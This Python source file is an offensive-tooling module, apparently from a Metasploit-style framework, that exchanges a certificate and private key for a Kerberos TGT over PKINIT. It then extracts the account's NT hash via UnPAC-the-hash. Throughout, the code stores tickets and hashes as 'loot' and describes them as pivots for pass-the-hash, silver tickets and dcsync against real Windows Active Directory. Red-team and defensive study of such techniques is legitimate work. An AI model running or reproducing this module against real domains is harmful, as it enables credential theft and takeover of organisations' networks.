"""PKINIT: trade a certificate for a TGT (RFC 4556), and UnPAC the hash.

The closer for every cert-based attack in the framework (esc1 today,
shadow credentials next): a client cert + key is an identity the KDC
will turn into a TGT. Two things come back:

  1. a ccache (loot) — the TGT, ready for pass-the-ticket / any
     Kerberos-capable tooling
  2. with UNPAC (default): the account's NT hash, recovered from the
     PAC the KDC embeds in a user-to-user ticket (PAC_CREDENTIAL_INFO)
     — silver tickets, PtH, dcsync. This is why PKINIT is the pivot.

The wire core lives in core/pkinit.py (shared with shadow_creds): DH
flavor on the static RFC 5114 group, hand-assembled CMS SignedData,
SHA-1 counter KDF. Reference implementations: dirkjanm/PKINITtools
(gettgtpkinit.py, getnthash.py), studied not vendored.

LAB NOTE: this module targets real Windows AD. Debian's Samba 4.17 KDC
ships without PKINIT (binary scan: no pkinit symbols), so the domain
lab can only exercise the error paths, not issuance.
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptString
from core.pkinit import PkinitError, parse_pem_bundle, request_tgt, \
    unpac_nthash

try:
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import Key, _enctype_table
except ImportError:
    CCache = None  # console gates run() on requirements


class Pkinit(AuxiliaryModule):
    name = "PKINIT (cert -> TGT, UnPAC the hash)"
    description = """
        Trades a certificate + private key for a TGT over PKINIT
        (RFC 4556, DH flavor) and writes a ccache to loot. UNPAC
        (default on) then recovers the account's NT hash from the PAC
        in a user-to-user ticket — the pivot from certs to hashes.
        CERTFILE takes a PEM bundle holding cert + key (exactly esc1's
        loot shape). Targets real Windows AD; Debian's Samba KDC has
        no PKINIT, so the lab only exercises error handling.
    """
    authors = ["you"]
    requirements = ["impacket", "cryptography"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="KDC (domain controller)"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Account the cert belongs to"))
        self.options.add(OptString("CERTFILE", required=True,
                                   description="PEM file with cert + key "
                                               "(esc1 loot shape)"))
        self.options.add(OptBool("UNPAC", default=True,
                                 description="Recover the NT hash via U2U PAC"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        certfile = str(self.get_option("CERTFILE"))
        try:
            with open(certfile, "rb") as f:
                bundle = f.read()
            cert, key = parse_pem_bundle(bundle)
        except Exception as e:
            self.print_error(f"{certfile}: can't load PEM cert+key - {e}")
            return
        self.print_debug(f"cert: subject={cert.subject.rfc4514_string()} "
                         f"issuer={cert.issuer.rfc4514_string()}")

        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self.print_status(f"{host}: requesting TGT for {user} via PKINIT")
            try:
                asrep, reply_key, session_key, etype = request_tgt(
                    host, domain, user, cert, key)
            except PkinitError as e:
                self.print_error(f"{host}: PKINIT request failed - {e}")
                continue
            ccache = CCache()
            ccache.fromTGT(asrep, Key(etype, reply_key), session_key)
            store = getattr(self.framework, "store", None)
            if store is not None:
                store.add_loot("ccache",
                               f"pkinit {user}@{domain} @ {host}",
                               ccache.getData(), address=host)
            self.print_good(f"{host}: TGT for {user}@{domain} saved as loot "
                            f"(ccache)")
            self.print_debug(f"{host}: reply key {reply_key.hex()}")
            if self.get_option("UNPAC"):
                self._unpac(host, domain, user, reply_key, session_key,
                            asrep, store)

    def _unpac(self, host, domain, user, reply_key, session_key,
               asrep, store):
        try:
            nthash = unpac_nthash(host, domain, user, reply_key,
                                  session_key, asrep)
        except PkinitError as e:
            self.print_error(f"{host}: UnPAC failed - {e}")
            return
        if nthash is None:
            self.print_error(f"{host}: no PAC_CREDENTIAL_INFO in the PAC — "
                             f"TGT didn't come from PKINIT?")
            return
        self.print_good(f"{host}: NT hash for {user}: {nthash}")
        if store is not None:
            store.add_cred(host, "ntlm", user, nthash, source="pkinit")
